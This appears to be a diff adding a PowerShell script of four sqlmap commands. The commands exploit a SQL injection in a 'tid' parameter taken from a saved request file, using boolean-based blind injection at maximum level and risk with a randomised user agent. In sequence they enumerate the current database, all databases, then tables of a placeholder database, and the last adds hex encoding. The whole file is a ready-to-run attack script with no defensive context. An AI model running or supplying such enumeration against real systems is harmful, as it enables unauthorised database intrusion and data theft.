@@ -1,0 +1,89 @@
+﻿sqlmap -r "sqlmap_requests_baseline\001_sql_injection_tid_3888037214562551033.txt" `
+    --batch `
+    --random-agent `
+    --level `
+    5 `
+    --risk `
+    3 `
+    --flush-session `
+    --drop-set-cookie `
+    --skip-static `
+    --output-dir `
+    "sqlmap_output_baseline\001_3888037214562551033" `
+    --force-ssl `
+    -p `
+    "tid" `
+    --technique=B `
+    --current-db `
+    --threads `
+    5 `
+    --fresh-queries
+
+sqlmap -r "sqlmap_requests_baseline\001_sql_injection_tid_3888037214562551033.txt" `
+    --batch `
+    --random-agent `
+    --level `
+    5 `
+    --risk `
+    3 `
+    --flush-session `
+    --drop-set-cookie `
+    --skip-static `
+    --output-dir `
+    "sqlmap_output_baseline\001_3888037214562551033" `
+    --force-ssl `
+    -p `
+    "tid" `
+    --technique=B `
+    --dbs `
+    --threads `
+    5 `
+    --fresh-queries
+
+sqlmap -r "sqlmap_requests_baseline\001_sql_injection_tid_3888037214562551033.txt" `
+    --batch `
+    --random-agent `
+    --level `
+    5 `
+    --risk `
+    3 `
+    --flush-session `
+    --drop-set-cookie `
+    --skip-static `
+    --output-dir `
+    "sqlmap_output_baseline\001_3888037214562551033" `
+    --force-ssl `
+    -p `
+    "tid" `
+    --technique=B `
+    -D `
+    DB_NAME_HERE `
+    --tables `
+    --threads `
+    5 `
+    --fresh-queries
+
+sqlmap -r "sqlmap_requests_baseline\001_sql_injection_tid_3888037214562551033.txt" `
+    --batch `
+    --random-agent `
+    --level `
+    5 `
+    --risk `
+    3 `
+    --flush-session `
+    --drop-set-cookie `
+    --skip-static `
+    --output-dir `
+    "sqlmap_output_baseline\001_3888037214562551033" `
+    --force-ssl `
+    -p `
+    "tid" `
+    --technique=B `
+    -D `
+    DB_NAME_HERE `
+    --tables `
+    --threads `
+    5 `
+    --fresh-queries `
+    --no-cast `
+    --hex
